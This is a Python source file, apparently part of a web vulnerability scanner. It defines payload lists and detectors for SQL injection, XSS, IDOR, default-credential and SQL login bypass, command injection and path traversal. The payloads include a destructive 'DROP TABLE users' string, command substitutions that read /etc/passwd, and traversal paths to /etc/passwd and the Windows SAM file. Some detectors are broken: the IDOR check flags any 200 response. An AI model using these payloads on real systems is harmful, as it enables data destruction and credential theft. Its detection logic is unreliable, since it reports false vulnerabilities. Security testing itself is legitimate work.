"""Real Payload Injection Engine - SQL, XSS, IDOR, Auth Bypass"""

from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from enum import Enum
import re

class VulnerabilityType(Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    IDOR = "idor"
    AUTH_BYPASS = "auth_bypass"
    RACE_CONDITION = "race_condition"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"

@dataclass
class Payload:
    type: VulnerabilityType
    payload: str
    detection_method: str
    expected_response: Optional[str] = None
    
class PayloadInjector:
    """Real payload injection with detection"""
    
    # SQL Injection payloads
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT NULL, NULL, NULL --",
        "'; DROP TABLE users; --",
        "' AND SLEEP(5) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
    ]
    
    # IDOR payloads (ID manipulation)
    IDOR_PAYLOADS = [
        {"original": 1, "test": 2},
        {"original": 100, "test": 101},
        {"original": "user_123", "test": "user_124"},
        {"original": "abc123", "test": "abc124"},
    ]
    
    # Auth bypass payloads
    AUTH_PAYLOADS = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "123456"},
        {"username": "admin", "password": "password"},
        {"username": "test", "password": "test"},
        {"username": "'OR'1'='1", "password": "'OR'1'='1"},
    ]
    
    # Command injection payloads
    COMMAND_PAYLOADS = [
        "; ls -la",
        "| whoami",
        "& ipconfig",
        "`cat /etc/passwd`",
        "$(whoami)",
    ]
    
    # Path traversal payloads
    PATH_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
    ]
    
    @staticmethod
    def generate_sql_payloads() -> List[Payload]:
        """Generate SQL injection payloads"""
        return [
            Payload(
                type=VulnerabilityType.SQL_INJECTION,
                payload=p,
                detection_method="response_time_analysis" if "SLEEP" in p else "error_message",
                expected_response="SQL error" if "DROP" not in p else None
            )
            for p in PayloadInjector.SQL_PAYLOADS
        ]
    
    @staticmethod
    def generate_xss_payloads() -> List[Payload]:
        """Generate XSS payloads"""
        return [
            Payload(
                type=VulnerabilityType.XSS,
                payload=p,
                detection_method="dom_inspection",
                expected_response=p  # Payload should be reflected in response
            )
            for p in PayloadInjector.XSS_PAYLOADS
        ]
    
    @staticmethod
    def generate_idor_payloads(original_id: Any) -> List[Payload]:
        """Generate IDOR payloads"""
        payloads = []
        
        if isinstance(original_id, int):
            # Try adjacent IDs
            for offset in [1, -1, 10, -10, 100, -100]:
                test_id = original_id + offset
                payloads.append(Payload(
                    type=VulnerabilityType.IDOR,
                    payload=str(test_id),
                    detection_method="access_control_check",
                    expected_response=f"Unauthorized"
                ))
        
        elif isinstance(original_id, str):
            # Try sequential strings
            base = original_id.rstrip('0123456789')
            num = int(original_id[len(base):]) if original_id[len(base):].isdigit() else 0
            
            for offset in [1, -1, 10, -10]:
                test_id = f"{base}{num + offset}"
                payloads.append(Payload(
                    type=VulnerabilityType.IDOR,
                    payload=test_id,
                    detection_method="access_control_check",
                    expected_response=f"Unauthorized"
                ))
        
        return payloads
    
    @staticmethod
    def generate_auth_bypass_payloads() -> List[Payload]:
        """Generate authentication bypass payloads"""
        return [
            Payload(
                type=VulnerabilityType.AUTH_BYPASS,
                payload=str(p),
                detection_method="login_success_check",
                expected_response="Dashboard"
            )
            for p in PayloadInjector.AUTH_PAYLOADS
        ]
    
    @staticmethod
    def generate_command_injection_payloads() -> List[Payload]:
        """Generate command injection payloads"""
        return [
            Payload(
                type=VulnerabilityType.COMMAND_INJECTION,
                payload=p,
                detection_method="command_output_analysis",
                expected_response="root"
            )
            for p in PayloadInjector.COMMAND_PAYLOADS
        ]
    
    @staticmethod
    def generate_path_traversal_payloads() -> List[Payload]:
        """Generate path traversal payloads"""
        return [
            Payload(
                type=VulnerabilityType.PATH_TRAVERSAL,
                payload=p,
                detection_method="file_content_analysis",
                expected_response="root:"
            )
            for p in PayloadInjector.PATH_PAYLOADS
        ]
    
    @staticmethod
    def detect_sql_injection(response: str, response_time: float) -> bool:
        """Detect SQL injection in response"""
        
        # Check for SQL error messages
        sql_errors = [
            "SQL error", "mysql_fetch", "Warning: mysql",
            "ORA-", "PostgreSQL", "SQLServer",
            "syntax error", "unexpected token"
        ]
        
        for error in sql_errors:
            if error.lower() in response.lower():
                return True
        
        # Check for time-based detection
        if response_time > 5:  # Suspicious delay
            return True
        
        return False
    
    @staticmethod
    def detect_xss(response: str, payload: str) -> bool:
        """Detect XSS in response"""
        
        # Check if payload is reflected in response
        if payload in response:
            return True
        
        # Check for script tags
        if "<script>" in response or "onerror=" in response:
            return True
        
        return False
    
    @staticmethod
    def detect_idor(response_status: int, original_status: int) -> bool:
        """Detect IDOR vulnerability"""
        
        # If we get 200 when we shouldn't, it's IDOR
        if response_status == 200 and original_status == 403:
            return True
        
        # If we get data we shouldn't have access to
        if response_status == 200:
            return True
        
        return False
    
    @staticmethod
    def detect_auth_bypass(response: str) -> bool:
        """Detect authentication bypass"""
        
        bypass_indicators = [
            "dashboard", "welcome", "logout",
            "user profile", "settings",
            "authenticated", "logged in"
        ]
        
        response_lower = response.lower()
        
        for indicator in bypass_indicators:
            if indicator in response_lower:
                return True
        
        return False

# Test
if __name__ == "__main__":
    injector = PayloadInjector()
    
    print("🔴 SQL Injection Payloads:")
    for p in injector.generate_sql_payloads()[:2]:
        print(f"  - {p.payload}")
    
    print("\n🔴 XSS Payloads:")
    for p in injector.generate_xss_payloads()[:2]:
        print(f"  - {p.payload}")
    
    print("\n✅ Payload Injector ready!")
